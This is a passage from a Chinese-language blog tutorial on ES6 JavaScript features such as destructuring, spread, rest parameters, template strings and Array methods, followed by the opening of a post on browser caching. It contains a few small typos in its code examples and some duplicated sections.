<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回一个数组</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> [a, b, c] = example();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回一个对象</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    foo: <span class="number">1</span>,</span><br><span class="line">    bar: <span class="number">2</span></span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> &#123; foo, bar &#125; = example();</span><br></pre></td></tr></table></figure>
<p>（3）提取 JSON 数据</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> jsonData = &#123;</span><br><span class="line">  retCode: <span class="string">&#x27;000000&#x27;</span>,</span><br><span class="line">  retInfo: <span class="string">&quot;字段校验成功&quot;</span>,</span><br><span class="line">  data: [<span class="number">867</span>, <span class="number">5309</span>]</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> &#123; retCode, retInfo, <span class="attr">data</span>: number &#125; = jsonData;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(id, status, number);</span><br><span class="line"><span class="comment">// &#x27;000000&#x27;, &quot;字段校验成功&quot;, [867, 5309]</span></span><br></pre></td></tr></table></figure>
<p>等等。。。。。。</p>
<h1 id="对象、数组、字符串的扩展"><a href="#对象、数组、字符串的扩展" class="headerlink" title="对象、数组、字符串的扩展"></a>对象、数组、字符串的扩展</h1><h4 id="对象的扩展"><a href="#对象的扩展" class="headerlink" title="对象的扩展"></a>对象的扩展</h4><p>对象定义过程中更简单写法</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> io = <span class="string">&#x27;computed&#x27;</span></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">	io,</span><br><span class="line">	<span class="function"><span class="title">foo</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="keyword">var</span> io = <span class="string">&#x27;computed&#x27;</span></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">	io: io,</span><br><span class="line">	foo: <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="built_in">console</span>.log(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="数组的扩展"><a href="#数组的扩展" class="headerlink" title="数组的扩展"></a>数组的扩展</h4><p>（1）扩展运算符<br>扩展运算符（spread）是三个点（…）。它好比 rest 参数的逆运算，将一个数组转为用逗号分隔的参数序列。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>, ...[<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>]) <span class="comment">// 1,2,3,4</span></span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line"><span class="built_in">console</span>.log(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于函数的参数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x + y</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> number = [<span class="number">35</span>, <span class="number">27</span>]</span><br><span class="line">add(...number) <span class="comment">// 62</span></span><br><span class="line"><span class="comment">// 相当于</span></span><br><span class="line">add(number[<span class="number">0</span>], number[<span class="number">1</span>])</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 用于函数替代apply的方法</span></span><br><span class="line"><span class="comment">// ES5 的写法</span></span><br><span class="line"><span class="built_in">Math</span>.max.apply(<span class="literal">null</span>, [<span class="number">14</span>, <span class="number">3</span>, <span class="number">77</span>])</span><br><span class="line"><span class="comment">// ES6 的写法</span></span><br><span class="line"><span class="built_in">Math</span>.max(...[<span class="number">14</span>, <span class="number">3</span>, <span class="number">77</span>])</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">Math</span>.max(<span class="number">14</span>, <span class="number">3</span>, <span class="number">77</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5</span></span><br><span class="line"><span class="keyword">new</span> (<span class="built_in">Date</span>.bind.apply(<span class="built_in">Date</span>, [<span class="literal">null</span>, <span class="number">2015</span>, <span class="number">1</span>, <span class="number">1</span>]))</span><br><span class="line"><span class="comment">// ES6</span></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Date</span>(...[<span class="number">2015</span>, <span class="number">1</span>, <span class="number">1</span>]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>扩展运算符的应用</p>
<p>1.复制数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 浅度复制</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> arrCopy = arr</span><br><span class="line"><span class="comment">// 这样的简单复制只是将数组的指针赋给了arrCopy变量，所以arr和arrCopy数组的元素改变时，另一个也会同时改变</span></span><br><span class="line">arr[<span class="number">0</span>] = <span class="number">1</span></span><br><span class="line"><span class="built_in">console</span>.log(arrCopy) <span class="comment">// [0, &#x27;world&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// es5解决方法</span></span><br><span class="line"><span class="keyword">const</span> arr = [<span class="string">&#x27;hello&#x27;</span>, <span class="string">&#x27;world&#x27;</span>]</span><br><span class="line"><span class="keyword">const</span> arrCopy = arr.concat()</span><br><span class="line">arr[<span class="number">0</span>] = <span class="string">&#x27;OK&#x27;</span></span><br><span class="line"><span class="built_in">console</span>.log(arrCopy) <span class="comment">// [&#x27;hello&#x27;, &#x27;world&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 扩展运算符提供了复制数组的简便写法。</span></span><br><span class="line"><span class="keyword">const</span> a1 = [<span class="number">1</span>, <span class="number">2</span>];</span><br><span class="line"><span class="comment">// 写法一</span></span><br><span class="line"><span class="keyword">const</span> a2 = [...a1];</span><br><span class="line"><span class="comment">// 写法二</span></span><br><span class="line"><span class="keyword">const</span> [...a2] = a1;</span><br><span class="line"><span class="comment">/* 注意：扩展运算符只能赋值数组元素为基本数据类型的元素，</span></span><br><span class="line"><span class="comment">如果元素的数据类型为引用类型，依然保存的是应用类型的指针 */</span></span><br></pre></td></tr></table></figure>
<p>2.合并数组</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> a = [<span class="number">2</span>, <span class="number">3</span>, <span class="number">5</span>]</span><br><span class="line"><span class="keyword">const</span> b = [<span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">// es5</span></span><br><span class="line">a.concat(b) <span class="comment">// [2,3,5,12,13]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="keyword">const</span> result = [...a, ...b] <span class="comment">// [2,3,5,12,13]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 这两种方式也都是浅拷贝，如果修改了原数组的成员，会同步反映到新数组。</span></span><br><span class="line"><span class="keyword">const</span> a1 = [&#123; <span class="attr">foo</span>: <span class="number">1</span> &#125;];</span><br><span class="line"><span class="keyword">const</span> a2 = [&#123; <span class="attr">bar</span>: <span class="number">2</span> &#125;];</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> a3 = a1.concat(a2);</span><br><span class="line"><span class="keyword">const</span> a4 = [...a1, ...a2];</span><br><span class="line"></span><br><span class="line">a3[<span class="number">0</span>] === a1[<span class="number">0</span>] <span class="comment">// true</span></span><br><span class="line">a4[<span class="number">0</span>] === a1[<span class="number">0</span>] <span class="comment">// true</span></span><br></pre></td></tr></table></figure>

<p>3.与解构赋值结合<br>扩展运算符可以与解构赋值结合起来，用于生成数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// ES5</span></span><br><span class="line">a = list[<span class="number">0</span>], rest = list.slice(<span class="number">1</span>)</span><br><span class="line"><span class="comment">// ES6</span></span><br><span class="line">[a, ...rest] = list</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [first, ...rest] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">first <span class="comment">// 1</span></span><br><span class="line">rest  <span class="comment">// [2, 3, 4, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first, ...rest] = [];</span><br><span class="line">first <span class="comment">// undefined</span></span><br><span class="line">rest  <span class="comment">// []</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first, ...rest] = [<span class="string">&quot;foo&quot;</span>];</span><br><span class="line">first  <span class="comment">// &quot;foo&quot;</span></span><br><span class="line">rest   <span class="comment">// []</span></span><br></pre></td></tr></table></figure>
<p>如果将扩展运算符用于数组赋值，只能放在参数的最后一位，否则会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> [...butLast, last] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="comment">// 报错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> [first, ...middle, last] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"><span class="comment">// 报错</span></span><br></pre></td></tr></table></figure>

<p>（2）Array.from()<br>Array.from方法用于将两类对象转为真正的数组：类似数组的对象（伪数组）和可遍历（iterable）的对象（包括 ES6 新增的数据结构 Set 和 Map）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> arrayLike = &#123;</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;b&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;c&#x27;</span>,</span><br><span class="line">    length: <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ES5的写法</span></span><br><span class="line"><span class="keyword">var</span> arr1 = [].slice.call(arrayLike); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// ES6的写法</span></span><br><span class="line"><span class="keyword">let</span> arr2 = <span class="built_in">Array</span>.from(arrayLike); <span class="comment">// [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]</span></span><br></pre></td></tr></table></figure>
<p>实际应用中，常见的类似数组的对象是 DOM 操作返回的 NodeList 集合，以及函数内部的arguments对象。Array.from都可以将它们转为真正的数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// NodeList对象</span></span><br><span class="line"><span class="keyword">let</span> ps = <span class="built_in">document</span>.querySelectorAll(<span class="string">&#x27;p&#x27;</span>);</span><br><span class="line"><span class="built_in">Array</span>.from(ps).filter(<span class="function"><span class="params">p</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> p.textContent.length &gt; <span class="number">100</span>;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// arguments对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> args = <span class="built_in">Array</span>.from(<span class="built_in">arguments</span>);</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>（3）Array.of()<br>Array.of方法用于将一组值，转换为数组。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>, <span class="number">11</span>, <span class="number">8</span>) <span class="comment">// [3,11,8]</span></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>) <span class="comment">// [3]</span></span><br><span class="line"><span class="built_in">Array</span>.of(<span class="number">3</span>).length <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>（4）数组实例的 includes()<br>Array.prototype.includes方法返回一个布尔值，表示某个数组是否包含给定的值，与字符串的includes方法类似。ES2016 引入了该方法。<br>参数： 该方法接受两个参数，第一个参数接受一个数值，第二个参数搜索的起始位置，默认为0。如果第二个参数为负数，则表示倒数的位置，如果这时它大于数组长度（比如第二个参数为-4，但数组长度为3），则会重置为从0开始。<br>返回值： 布尔类型，true表示搜索的结果在当前的数组中</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">2</span>)     <span class="comment">// true</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">4</span>)     <span class="comment">// false</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="literal">NaN</span>].includes(<span class="literal">NaN</span>) <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, <span class="number">3</span>);  <span class="comment">// false</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>].includes(<span class="number">3</span>, -<span class="number">1</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>与indexOf的比较：indexOf的含义是找到参数值的第一个出现位置，所以要去比较是否不等于-1，表达起来不够直观。二是，它内部使用严格相等运算符（===）进行判断，这会导致对NaN的误判。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">[<span class="literal">NaN</span>].indexOf(<span class="literal">NaN</span>)</span><br></pre></td></tr></table></figure>

<p>下面代码用来检查当前环境是否支持该方法，如果不支持，部署一个简易的替代版本。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> contains = (<span class="function">() =&gt;</span></span><br><span class="line">  <span class="built_in">Array</span>.prototype.includes</span><br><span class="line">    ? <span class="function">(<span class="params">arr, value</span>) =&gt;</span> arr.includes(value)</span><br><span class="line">    : <span class="function">(<span class="params">arr, value</span>) =&gt;</span> arr.some(<span class="function"><span class="params">el</span> =&gt;</span> el === value)</span><br><span class="line">)();</span><br><span class="line">contains([<span class="string">&#x27;foo&#x27;</span>, <span class="string">&#x27;bar&#x27;</span>], <span class="string">&#x27;baz&#x27;</span>); <span class="comment">// =&gt; false</span></span><br></pre></td></tr></table></figure>

<h4 id="字符串的扩展"><a href="#字符串的扩展" class="headerlink" title="字符串的扩展"></a>字符串的扩展</h4><p>模版字符串</p>
<p>模板字符串（template string）是增强版的字符串，用反引号（`）标识。它可以当作普通字符串使用，也可以用来定义多行字符串，或者在字符串中嵌入变量。</p>
<p>传统的 JavaScript 语言，输出模板通常是这样写的（下面使用了 jQuery 的方法）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">$(<span class="string">&#x27;#result&#x27;</span>).append(</span><br><span class="line">  <span class="string">&#x27;There are &lt;b&gt;&#x27;</span> + basket.count + <span class="string">&#x27;&lt;/b&gt; &#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;items in your basket, &#x27;</span> +</span><br><span class="line">  <span class="string">&#x27;&lt;em&gt;&#x27;</span> + basket.onSale +</span><br><span class="line">  <span class="string">&#x27;&lt;/em&gt; are on sale!&#x27;</span></span><br><span class="line">);</span><br><span class="line"><span class="comment">/*上面这种写法相当繁琐不方便，因为变量与字符串之间的拼接需要用到+和引号，</span></span><br><span class="line"><span class="comment">并且换行时不方便，ES6 引入了模板字符串解决这个问题。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$(<span class="string">&#x27;#result&#x27;</span>).append(<span class="string">`</span></span><br><span class="line"><span class="string">  There are &lt;b&gt;<span class="subst">$&#123;basket.count&#125;</span>&lt;/b&gt; items</span></span><br><span class="line"><span class="string">   in your basket, &lt;em&gt;<span class="subst">$&#123;basket.onSale&#125;</span>&lt;/em&gt;</span></span><br><span class="line"><span class="string">  are on sale!</span></span><br><span class="line"><span class="string">`</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 普通字符串</span></span><br><span class="line"><span class="string">`In JavaScript &#x27;\n&#x27; is a line-feed.`</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 多行字符串</span></span><br><span class="line"><span class="string">`In JavaScript this is</span></span><br><span class="line"><span class="string"> not legal.`</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">`string text line 1</span></span><br><span class="line"><span class="string">string text line 2`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 字符串中嵌入变量</span></span><br><span class="line"><span class="keyword">let</span> name = <span class="string">&quot;Bob&quot;</span>, time = <span class="string">&quot;today&quot;</span>;</span><br><span class="line"><span class="string">`Hello <span class="subst">$&#123;name&#125;</span>, how are you <span class="subst">$&#123;time&#125;</span>?`</span></span><br></pre></td></tr></table></figure>

<h4 id="函数的扩展"><a href="#函数的扩展" class="headerlink" title="函数的扩展"></a>函数的扩展</h4><p>（1）函数参数的默认值<br>es6增加了函数参数的默认值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// es5</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span> (<span class="params">x, y</span>) </span>&#123;</span><br><span class="line">	<span class="built_in">this</span>.x = x || <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">	<span class="built_in">this</span>.y = y || <span class="string">&#x27;world&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// es6</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span> (<span class="params">x = <span class="string">&#x27;hello&#x27;</span>, y = <span class="string">&#x27;world&#x27;</span></span>) </span>&#123;</span><br><span class="line">	<span class="built_in">this</span>.x = x ;</span><br><span class="line">	<span class="built_in">this</span>.y = y<span class="string">&#x27;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>设置函数的默认参数之后，函数内部不能再次声明，否则会报错</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">boo</span> (<span class="params">x = <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">	<span class="keyword">let</span> x;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Identifier &#x27;x&#x27; has already been declared</span></span><br></pre></td></tr></table></figure>

<p>另外，一个容易忽略的地方是，参数默认值不是传值的，而是每次都重新计算默认值表达式的值。也就是说，参数默认值是惰性求值的。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> x = <span class="number">99</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">p = x + <span class="number">1</span></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foo() <span class="comment">// 100</span></span><br><span class="line"></span><br><span class="line">x = <span class="number">100</span>;</span><br><span class="line">foo() <span class="comment">// 101</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，参数p的默认值是x + 1。这时，每次调用函数foo，都会重新计算x + 1，而不是默认p等于 100。</p>
<p>（2）rest 参数<br>ES6 引入 rest 参数（形式为…变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest 参数搭配的变量是一个数组，该变量将多余的参数放入数组中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">...values</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> val <span class="keyword">of</span> values) &#123;</span><br><span class="line">    sum += val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>) <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>上面代码的add函数是一个求和函数，利用 rest 参数，可以向该函数传入任意数目的参数。</p>
<p>下面是一个 rest 参数代替arguments变量的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arguments变量的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortNumbers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>).sort();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rest参数的写法</span></span><br><span class="line"><span class="keyword">const</span> sortNumbers = <span class="function">(<span class="params">...numbers</span>) =&gt;</span> numbers.sort();</span><br></pre></td></tr></table></figure>
<p>上面代码的两种写法，比较后可以发现，rest 参数的写法更自然也更简洁。</p>
<p>arguments对象不是数组，而是一个类似数组的对象。所以为了使用数组的方法，必须使用Array.prototype.slice.call先将其转为数组。rest 参数就不存在这个问题，它就是一个真正的数组，数组特有的方法都可以使用。下面是一个利用 rest 参数改写数组push方法的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">array, ...items</span>) </span>&#123;</span><br><span class="line">  items.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    array.push(item);</span><br><span class="line">    <span class="built_in">console</span>.log(item);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line">push(a, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>ES6 引入 rest 参数（形式为…变量名），用于获取函数的多余参数，这样就不需要使用arguments对象了。rest 参数搭配的变量是一个数组，该变量将多余的参数放入数组中。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params">...values</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> val <span class="keyword">of</span> values) &#123;</span><br><span class="line">    sum += val;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">5</span>, <span class="number">3</span>) <span class="comment">// 10</span></span><br></pre></td></tr></table></figure>
<p>上面代码的add函数是一个求和函数，利用 rest 参数，可以向该函数传入任意数目的参数。</p>
<p>下面是一个 rest 参数代替arguments变量的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// arguments变量的写法</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sortNumbers</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Array</span>.prototype.slice.call(<span class="built_in">arguments</span>).sort();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// rest参数的写法</span></span><br><span class="line"><span class="keyword">const</span> sortNumbers = <span class="function">(<span class="params">...numbers</span>) =&gt;</span> numbers.sort();</span><br></pre></td></tr></table></figure>
<p>上面代码的两种写法，比较后可以发现，rest 参数的写法更自然也更简洁。</p>
<p>arguments对象不是数组，而是一个类似数组的对象。所以为了使用数组的方法，必须使用Array.prototype.slice.call先将其转为数组。rest 参数就不存在这个问题，它就是一个真正的数组，数组特有的方法都可以使用。下面是一个利用 rest 参数改写数组push方法的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">push</span>(<span class="params">array, ...items</span>) </span>&#123;</span><br><span class="line">  items.forEach(<span class="function"><span class="keyword">function</span>(<span class="params">item</span>) </span>&#123;</span><br><span class="line">    array.push(item);</span><br><span class="line">    <span class="built_in">console</span>.log(item);</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = [];</span><br><span class="line">push(a, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure>
<p>注意，rest 参数之后不能再有其他参数（即只能是最后一个参数），否则会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, ...b, c</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数的length属性，不包括 rest 参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;&#125;).length  <span class="comment">// 1</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">...a</span>) </span>&#123;&#125;).length  <span class="comment">// 0</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a, ...b</span>) </span>&#123;&#125;).length  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
<p>注意，rest 参数之后不能再有其他参数（即只能是最后一个参数），否则会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 报错</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params">a, ...b, c</span>) </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>函数的length属性，不包括 rest 参数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>) </span>&#123;&#125;).length  <span class="comment">// 1</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">...a</span>) </span>&#123;&#125;).length  <span class="comment">// 0</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a, ...b</span>) </span>&#123;&#125;).length  <span class="comment">// 1</span></span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>javascript</category>
      </categories>
  </entry>
  <entry>
    <title>浏览器缓存基本认识</title>
    <url>/nirvana/javascript/%E5%89%8D%E7%AB%AF/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%86/</url>
    <content><![CDATA[<p>浏览器缓存，也就是客户端缓存，既是网页性能优化里面静态资源相关优化的一大利器，也是无数web开发人员在工作过程不可避免的一大问题，所以在产品开发的时候我们总是想办法避免缓存产生，而在产品发布之时又在想策略管理缓存提升网页的访问速度。了解浏览器的缓存命中原理，是开发web应用的基础，本文着眼于此，学习浏览器缓存的相关知识，总结缓存避免和缓存管理的方法，结合具体的场景说明缓存的相关问题。希望能对有需要的人有所帮助。</p>
<p>1. 浏览器缓存基本认识</p>
<p>它分为强缓存和协商缓存： </p>
<p>1）浏览器在加载资源时，先根据这个资源的一些http header判断它是否命中强缓存，强缓存如果命中，浏览器直接从自己的缓存中读取资源，不会发请求到服务器。比如某个css文件，如果浏览器在加载它所在的网页时，这个css文件的缓存配置命中了强缓存，浏览器就直接从缓存中加载这个css，连请求都不会发送到网页所在服务器；</p>
<p>2）当强缓存没有命中的时候，浏览器一定会发送一个请求到服务器，通过服务器端依据资源的另外一些http header验证这个资源是否命中协商缓存，如果协商缓存命中，服务器会将这个请求返回，但是不会返回这个资源的数据，而是告诉客户端可以直接从缓存中加载这个资源，于是浏览器就又会从自己的缓存中去加载这个资源；</p>
<p>3）强缓存与协商缓存的共同点是：如果命中，都是从客户端缓存中加载资源，而不是从服务器加载资源数据；区别是：强缓存不发请求到服务器，协商缓存会发请求到服务器。</p>
<p>4）当协商缓存也没有命中的时候，浏览器直接从服务器加载资源数据。</p>
<p>2. 强缓存的原理</p>
<p>当浏览器对某个资源的请求命中了强缓存时，返回的http状态为200，在chrome的开发者工具的network里面size会显示为from cache，比如京东的首页里就有很多静态资源配置了强缓存，用chrome打开几次，再用f12查看network，可以看到有不少请求就是从缓存中加载的：</p>
<p><img src="https://upload-images.jianshu.io/upload_images/10024246-cfb575b65a490aa6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/800/format/webp" alt="image"></p>
